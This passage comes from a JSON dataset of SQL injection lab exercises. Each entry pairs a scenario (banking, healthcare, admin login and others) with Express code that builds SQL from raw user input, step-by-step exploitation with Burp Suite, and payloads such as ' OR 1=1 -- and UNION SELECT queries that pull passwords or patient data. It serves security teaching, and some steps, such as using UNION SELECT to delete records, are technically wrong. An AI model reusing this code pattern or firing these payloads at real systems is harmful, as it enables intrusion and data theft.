      "Verify successful configuration manipulation or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-settings', (req, res) => {\n  const { deviceId, setting } = req.body;\n  const sql = `UPDATE devices SET setting = '${setting}' WHERE device_id = '${deviceId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update device setting');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, device_name, firmware_version FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-commerce Platform - SQL Injection in Login Page",
    "Lab Description": "The login page of the e-commerce platform is vulnerable to SQL Injection. Attackers can inject SQL payloads into the username or password fields to bypass authentication and gain unauthorized access to accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request using Burp Suite to identify the vulnerable parameters (username, password).",
      "Inject basic SQL payloads like ' OR 1=1 -- to bypass the login.",
      "Verify the login bypass by accessing the user account without valid credentials.",
      "Extract account information if needed."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a --"
    ]
  },
  {
    "Lab scenario": "API - SQL Injection in Search Endpoint",
    "Lab Description": "An API endpoint used for searching products is vulnerable to SQL Injection. Attackers can inject SQL payloads into the search parameter to retrieve unauthorized product data or manipulate the search results.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a search request and identify the vulnerable search parameter.",
      "Inject SQL payloads like ' UNION SELECT product_id, name, price FROM products -- to extract product information.",
      "Verify successful data retrieval or manipulation.",
      "Exploit any identified data for further system access if necessary."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM products WHERE name LIKE '%${query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, name, price FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Balance Check",
    "Lab Description": "The banking portal has a balance check feature that is vulnerable to SQL Injection. An attacker can inject SQL payloads into the balance check request to retrieve sensitive information like account balances and transaction history.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the balance check request using Burp Suite to identify the vulnerable parameter (account number).",
      "Inject SQL payloads like ' UNION SELECT account_id, balance FROM accounts -- to extract account balances.",
      "Use time-based SQL injection to confirm successful data retrieval.",
      "Verify the successful extraction of sensitive account data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/balance', (req, res) => {\n  const { account_id } = req.query;\n  const sql = `SELECT * FROM accounts WHERE account_id = '${account_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance check failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_id, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Admin Panel - SQL Injection in User Management",
    "Lab Description": "The admin panel of a web application is vulnerable to SQL Injection. The vulnerability exists in the user management section, where the admin can update or delete users. An attacker could manipulate the user data or delete users using SQL injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the user management request using Burp Suite to identify the vulnerable parameters (user ID, action).",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract user data.",
      "Use UNION SELECT to modify or delete users from the database.",
      "Verify the system compromise by checking the user management functionality after exploitation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/admin/users', (req, res) => {\n  const { user_id, action } = req.body;\n  const sql = `UPDATE users SET action = '${action}' WHERE user_id = '${user_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Action failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Device - SQL Injection in Device Configuration",
    "Lab Description": "The IoT device configuration page is vulnerable to SQL Injection. Attackers can inject SQL payloads into configuration settings, allowing them to alter device configurations or retrieve sensitive data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the device configuration request using Burp Suite to identify vulnerable parameters (device_id, config_type).",
      "Inject SQL payloads like ' UNION SELECT device_id, config_value FROM devices -- to extract configuration data.",
      "Use UNION SELECT to modify the device's configuration or alter firmware.",
      "Verify the success of configuration manipulation or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-config', (req, res) => {\n  const { device_id, config_type } = req.body;\n  const sql = `UPDATE devices SET config_type = '${config_type}' WHERE device_id = '${device_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update configuration');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, config_value FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Content Management System - SQL Injection in Article Comments",
    "Lab Description": "The article comment section of a CMS is vulnerable to SQL Injection. Attackers can inject SQL payloads into the comment submission form, potentially extracting sensitive user information or altering articles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the comment submission request using Burp Suite to identify the vulnerable comment field.",
      "Inject SQL payloads like ' UNION SELECT username, email FROM users -- to extract user data.",
      "Use Boolean-based SQL injection to infer hidden data or article content.",
      "Verify successful data extraction or modification of articles."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-comment', (req, res) => {\n  const { comment } = req.body;\n  const sql = `INSERT INTO comments (comment) VALUES ('${comment}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Cloud Storage - SQL Injection in File Search",
    "Lab Description": "A cloud storage application\u00e2\u20ac\u2122s file search feature is vulnerable to SQL Injection. Attackers can inject SQL payloads to retrieve file metadata or sensitive information, potentially leading to unauthorized access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the file search request using Burp Suite to identify vulnerable parameters (file_name).",
      "Inject SQL payloads like ' UNION SELECT file_id, file_name, file_size FROM files -- to extract file metadata.",
      "Use Boolean-based SQL injection to confirm the presence of sensitive files.",
      "Verify successful data retrieval or unauthorized access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-file', (req, res) => {\n  const { file_name } = req.query;\n  const sql = `SELECT * FROM files WHERE file_name LIKE '%${file_name}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT file_id, file_name, file_size FROM files --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Financial Portal - SQL Injection in Transaction History",
    "Lab Description": "The financial portal's transaction history page is vulnerable to SQL Injection. Attackers can inject SQL payloads into the transaction ID field to retrieve sensitive transaction information or manipulate transaction records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the transaction history request using Burp Suite to identify vulnerable parameters (transaction_id).",
      "Inject SQL payloads like ' UNION SELECT transaction_id, amount, date FROM transactions -- to extract transaction details.",
      "Use UNION SELECT to modify transaction records or redirect funds.",
      "Verify the success of transaction manipulation or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const { transaction_id } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transaction_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction history failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, amount, date FROM transactions --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Admin Dashboard - SQL Injection in User Deletion",
    "Lab Description": "The admin dashboard allows admin users to delete accounts but is vulnerable to SQL Injection. An attacker could exploit this vulnerability to delete or alter user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the user deletion request using Burp Suite to identify vulnerable parameters (user_id).",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to retrieve user data.",
      "Use UNION SELECT to modify or delete user records.",
      "Verify successful data deletion or modification in the admin dashboard."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/admin/delete-user', (req, res) => {\n  const { user_id } = req.body;\n  const sql = `DELETE FROM users WHERE user_id = '${user_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to delete user');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal - SQL Injection in Patient Records",
    "Lab Description": "The healthcare portal contains a vulnerable patient record page where an attacker can inject SQL payloads into the patient ID field to retrieve sensitive medical information, such as patient details and diagnoses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the patient records request using Burp Suite to identify vulnerable parameters (patient_id).",
      "Inject SQL payloads like ' UNION SELECT patient_name, diagnosis, treatment FROM patient_records -- to extract medical data.",
      "Use Boolean-based SQL injection to confirm the presence of sensitive patient information.",
      "Verify successful extraction of patient data from the records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/patient-record', (req, res) => {\n  const { patient_id } = req.query;\n  const sql = `SELECT * FROM patient_records WHERE patient_id = '${patient_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving patient record');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT patient_name, diagnosis, treatment FROM patient_records --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Social Media Platform - SQL Injection in User Profile",
    "Lab Description": "A social media platform's user profile page is vulnerable to SQL Injection. An attacker can inject SQL payloads into the profile update form, enabling them to extract sensitive user data or modify profile details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the profile update request using Burp Suite to identify vulnerable parameters (user_id, profile_data).",
      "Inject SQL payloads like ' UNION SELECT username, email, date_of_birth FROM users -- to extract user details.",
      "Use UNION SELECT to modify user profile information.",
      "Verify successful profile data extraction or modification."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-profile', (req, res) => {\n  const { user_id, profile_data } = req.body;\n  const sql = `UPDATE users SET profile_data = '${profile_data}' WHERE user_id = '${user_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error updating profile');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email, date_of_birth FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Travel Booking Portal - SQL Injection in Booking Details",
    "Lab Description": "The travel booking portal has a booking details page that is vulnerable to SQL Injection. Attackers can inject SQL payloads into the booking reference field to retrieve confidential booking information such as payment details and travel itinerary.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the booking details request using Burp Suite to identify vulnerable parameters (booking_reference).",
      "Inject SQL payloads like ' UNION SELECT booking_id, payment_status, travel_date FROM bookings -- to extract booking details.",
      "Use time-based SQL injection to confirm the presence of sensitive data in the system.",
      "Verify successful extraction of payment and travel details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/booking-details', (req, res) => {\n  const { booking_reference } = req.query;\n  const sql = `SELECT * FROM bookings WHERE booking_reference = '${booking_reference}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving booking details');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT booking_id, payment_status, travel_date FROM bookings --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Inventory Management System - SQL Injection in Item Lookup",
    "Lab Description": "The inventory management system's item lookup page is vulnerable to SQL Injection. An attacker can inject SQL payloads into the item ID field to retrieve item details or manipulate the inventory database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the item lookup request using Burp Suite to identify vulnerable parameters (item_id).",
      "Inject SQL payloads like ' UNION SELECT item_name, price, quantity FROM inventory -- to extract item details.",
      "Use UNION SELECT to modify inventory records or alter stock quantities.",
      "Verify successful data retrieval or modification of inventory records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/item-lookup', (req, res) => {\n  const { item_id } = req.query;\n  const sql = `SELECT * FROM inventory WHERE item_id = '${item_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving item');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT item_name, price, quantity FROM inventory --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Forum - SQL Injection in Post Comments",
    "Lab Description": "The online forum has a comment section where users can post comments. This section is vulnerable to SQL Injection. Attackers can inject SQL payloads into the comment submission form to extract user information or modify posts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the comment submission request using Burp Suite to identify the vulnerable parameter (comment).",
      "Inject SQL payloads like ' UNION SELECT username, email FROM users -- to extract user data.",
      "Use UNION SELECT to modify or delete forum posts.",
      "Verify successful data extraction or post modification."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-comment', (req, res) => {\n  const { comment } = req.body;\n  const sql = `INSERT INTO comments (comment) VALUES ('${comment}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Job Portal - SQL Injection in Job Application",
    "Lab Description": "The job portal is vulnerable to SQL Injection in the job application form. Attackers can inject SQL payloads into the applicant ID field to retrieve sensitive job application data or modify existing records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the job application request using Burp Suite to identify vulnerable parameters (applicant_id).",
      "Inject SQL payloads like ' UNION SELECT applicant_name, job_title, application_status FROM applications -- to extract application details.",
      "Use UNION SELECT to modify job application statuses or change applicant data.",
      "Verify successful data retrieval or modification of job applications."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/job-application', (req, res) => {\n  const { applicant_id } = req.body;\n  const sql = `UPDATE applications SET status = 'approved' WHERE applicant_id = '${applicant_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error updating application');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT applicant_name, job_title, application_status FROM applications --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Store - SQL Injection in Product Price Update",
    "Lab Description": "The online store has a feature to update product prices, but the input field is vulnerable to SQL Injection. Attackers can inject SQL payloads into the price update request to change product prices or extract pricing data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the price update request using Burp Suite to identify vulnerable parameters (product_id, price).",
      "Inject SQL payloads like ' UNION SELECT product_name, price, category FROM products -- to extract product data.",
      "Use UNION SELECT to modify product prices or insert new products.",
      "Verify successful price modification or data retrieval."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-price', (req, res) => {\n  const { product_id, price } = req.body;\n  const sql = `UPDATE products SET price = '${price}' WHERE product_id = '${product_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error updating price');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT product_name, price, category FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Banking - SQL Injection in Account Balance",
    "Lab Description": "The online banking application is vulnerable to SQL Injection. An attacker can inject malicious SQL payloads into the account balance query to retrieve sensitive financial data or perform unauthorized transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the account balance request using Burp Suite to identify vulnerable parameters (account_id).",
      "Inject SQL payloads like ' UNION SELECT account_number, balance, last_transaction FROM accounts -- to extract financial details.",
      "Use time-based SQL injection to confirm the presence of sensitive data.",
      "Verify successful extraction of account balance and transaction details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { account_id } = req.query;\n  const sql = `SELECT * FROM accounts WHERE account_id = '${account_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving account balance');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance, last_transaction FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-Commerce Site - SQL Injection in Product Search",
    "Lab Description": "The e-commerce site's product search functionality is vulnerable to SQL Injection. An attacker can inject SQL payloads into the search query to extract product details, including prices and descriptions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the product search request using Burp Suite to identify vulnerable parameters (search_term).",
      "Inject SQL payloads like ' UNION SELECT product_name, price, description FROM products -- to extract product data.",
      "Use UNION SELECT to retrieve multiple products' details.",
      "Verify successful retrieval of product data from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { search_term } = req.query;\n  const sql = `SELECT * FROM products WHERE product_name LIKE '%${search_term}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching for products');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_name, price, description FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Forum - SQL Injection in User Login",
    "Lab Description": "The online forum's user login form is vulnerable to SQL Injection. An attacker can inject SQL payloads into the login credentials to bypass authentication and gain access to user accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request using Burp Suite to identify vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication.",
      "Test various payloads to successfully log in as any user.",
      "Verify successful login with unauthorized access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error logging in');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a' --"
    ]
  },
  {
    "Lab scenario": "Real Estate Portal - SQL Injection in Property Listings",
    "Lab Description": "The real estate portal has a search functionality for filtering property listings based on price and location. The search is vulnerable to SQL Injection, which allows attackers to extract property information, including addresses and prices.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the property search request using Burp Suite to identify vulnerable parameters (price, location).",
      "Inject SQL payloads like ' UNION SELECT address, price, type FROM properties -- to extract property details.",
      "Use UNION SELECT to retrieve details of multiple properties.",
      "Verify successful extraction of property information from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-properties', (req, res) => {\n  const { price, location } = req.query;\n  const sql = `SELECT * FROM properties WHERE price <= '${price}' AND location = '${location}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching properties');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT address, price, type FROM properties --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Student Portal - SQL Injection in Course Registration",
    "Lab Description": "The student portal contains a course registration page that is vulnerable to SQL Injection. An attacker can inject SQL payloads into the student ID field to manipulate course registrations and extract sensitive student data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the course registration request using Burp Suite to identify vulnerable parameters (student_id).",
      "Inject SQL payloads like ' UNION SELECT student_name, course_name, registration_date FROM registrations -- to extract student registration data.",
      "Use UNION SELECT to manipulate course registration information.",
      "Verify successful extraction or modification of course registration data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/register-course', (req, res) => {\n  const { student_id, course_id } = req.body;\n  const sql = `INSERT INTO registrations (student_id, course_id) VALUES ('${student_id}', '${course_id}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error registering for course');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT student_name, course_name, registration_date FROM registrations --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Admin Dashboard - SQL Injection in Admin Login",
    "Lab Description": "The admin dashboard's login page is vulnerable to SQL Injection. An attacker can inject SQL payloads into the username and password fields to bypass authentication and gain access to the admin interface.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the admin login request using Burp Suite to identify vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication.",
      "Test various payloads to successfully log in as an admin user.",
      "Verify successful login with unauthorized admin access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/admin-login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM admins WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error logging in');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a' --"
    ]
  },
  {
    "Lab scenario": "Online Shopping Cart - SQL Injection in Cart Checkout",
    "Lab Description": "The online shopping cart system is vulnerable to SQL Injection during checkout. An attacker can inject SQL payloads into the checkout form to extract payment details or modify order information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the checkout request using Burp Suite to identify vulnerable parameters (cart_id, payment_info).",
      "Inject SQL payloads like ' UNION SELECT cart_id, product_name, price FROM cart_items -- to extract cart details.",
      "Use UNION SELECT to manipulate the checkout process or retrieve payment information.",
      "Verify successful extraction or modification of cart details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/checkout', (req, res) => {\n  const { cart_id, payment_info } = req.body;\n  const sql = `SELECT * FROM cart WHERE cart_id = '${cart_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error processing checkout');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT cart_id, product_name, price FROM cart_items --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Music Streaming Service - SQL Injection in Playlist Creation",
    "Lab Description": "The music streaming service's playlist creation form is vulnerable to SQL Injection. Attackers can inject SQL payloads to modify existing playlists or extract sensitive data such as user information and playlist details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the playlist creation request using Burp Suite to identify vulnerable parameters (playlist_name, user_id).",
      "Inject SQL payloads like ' UNION SELECT username, playlist_name, track_count FROM playlists -- to extract playlist details.",
      "Use UNION SELECT to modify playlist data or manipulate user information.",
      "Verify successful data extraction or modification of playlist."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/create-playlist', (req, res) => {\n  const { playlist_name, user_id } = req.body;\n  const sql = `INSERT INTO playlists (user_id, playlist_name) VALUES ('${user_id}', '${playlist_name}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error creating playlist');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, playlist_name, track_count FROM playlists --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Library Management System - SQL Injection in Book Search",
    "Lab Description": "The library management system's book search functionality is vulnerable to SQL Injection. An attacker can inject SQL payloads into the search query to extract book details, including author information and publication dates.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the book search request using Burp Suite to identify vulnerable parameters (search_term).",
      "Inject SQL payloads like ' UNION SELECT book_title, author, publication_date FROM books -- to extract book details.",
      "Use UNION SELECT to retrieve details of multiple books.",
      "Verify successful extraction of book data from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-books', (req, res) => {\n  const { search_term } = req.query;\n  const sql = `SELECT * FROM books WHERE book_title LIKE '%${search_term}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching books');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT book_title, author, publication_date FROM books --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Inventory Management System - SQL Injection in Item Search",
    "Lab Description": "The inventory management system has a vulnerable item search feature. An attacker can inject SQL payloads into the item search field to retrieve sensitive inventory data, such as item prices, quantities, and supplier information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the item search request using Burp Suite to identify vulnerable parameters (search_query).",
      "Inject SQL payloads like ' UNION SELECT item_name, price, quantity, supplier FROM inventory -- to extract inventory data.",
      "Use UNION SELECT to retrieve sensitive details of multiple items.",
      "Verify successful extraction of inventory data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-items', (req, res) => {\n  const { search_query } = req.query;\n  const sql = `SELECT * FROM inventory WHERE item_name LIKE '%${search_query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching items');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT item_name, price, quantity, supplier FROM inventory --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Employee Portal - SQL Injection in Salary Query",
    "Lab Description": "The employee portal allows employees to query their salary details. This query is vulnerable to SQL Injection, which allows attackers to extract salary data for all employees and potentially alter sensitive financial records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the salary query request using Burp Suite to identify vulnerable parameters (employee_id).",
      "Inject SQL payloads like ' UNION SELECT employee_name, salary, department FROM employees -- to extract salary and employee information.",
      "Use time-based SQL injection to confirm the presence of the data.",
      "Verify successful extraction or manipulation of employee salary data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/salary-details', (req, res) => {\n  const { employee_id } = req.query;\n  const sql = `SELECT * FROM employees WHERE employee_id = '${employee_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error fetching salary details');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT employee_name, salary, department FROM employees --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Job Portal - SQL Injection in Job Application",
    "Lab Description": "The job portal allows users to apply for jobs by submitting their resumes. The job application form is vulnerable to SQL Injection, allowing an attacker to retrieve job applicant data, including resumes, personal information, and job preferences.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the job application request using Burp Suite to identify vulnerable parameters (job_id, applicant_id).",
      "Inject SQL payloads like ' UNION SELECT applicant_name, resume, job_position FROM job_applications -- to extract applicant data.",
      "Use UNION SELECT to retrieve multiple applicants' data.",
      "Verify successful extraction of job application information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/apply-job', (req, res) => {\n  const { job_id, applicant_id, resume } = req.body;\n  const sql = `INSERT INTO job_applications (job_id, applicant_id, resume) VALUES ('${job_id}', '${applicant_id}', '${resume}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error applying for job');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT applicant_name, resume, job_position FROM job_applications --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Healthcare System - SQL Injection in Patient Record Search",
    "Lab Description": "The healthcare system's patient record search feature is vulnerable to SQL Injection. An attacker can extract sensitive patient information, including medical history, diagnosis, and treatment records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the patient record search request using Burp Suite to identify vulnerable parameters (patient_id).",
      "Inject SQL payloads like ' UNION SELECT patient_name, diagnosis, treatment FROM patient_records -- to extract medical details.",
      "Use out-of-band SQL injection to confirm the presence of the data.",
      "Verify successful extraction of sensitive patient data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/patient-records', (req, res) => {\n  const { patient_id } = req.query;\n  const sql = `SELECT * FROM patient_records WHERE patient_id = '${patient_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving patient records');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT patient_name, diagnosis, treatment FROM patient_records --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Customer Support Portal - SQL Injection in Ticket Management",
    "Lab Description": "The customer support portal allows users to submit tickets for technical support. The ticket management system is vulnerable to SQL Injection, which can be exploited to extract sensitive support tickets or modify ticket statuses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the ticket submission request using Burp Suite to identify vulnerable parameters (ticket_id, customer_id).",
      "Inject SQL payloads like ' UNION SELECT ticket_title, issue_description, status FROM support_tickets -- to extract support ticket data.",
      "Use time-based SQL injection to confirm the presence of the data.",
      "Verify successful extraction or manipulation of support ticket data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-ticket', (req, res) => {\n  const { ticket_id, customer_id, description } = req.body;\n  const sql = `INSERT INTO support_tickets (ticket_id, customer_id, description) VALUES ('${ticket_id}', '${customer_id}', '${description}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error submitting ticket');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT ticket_title, issue_description, status FROM support_tickets --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Hotel Reservation System - SQL Injection in Room Availability Check",
    "Lab Description": "The hotel reservation system is vulnerable to SQL Injection in the room availability check. An attacker can manipulate the query to extract information on available rooms, their prices, and booking details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the room availability check request using Burp Suite to identify vulnerable parameters (room_type, date).",
      "Inject SQL payloads like ' UNION SELECT room_type, price, available_dates FROM rooms -- to extract room details.",
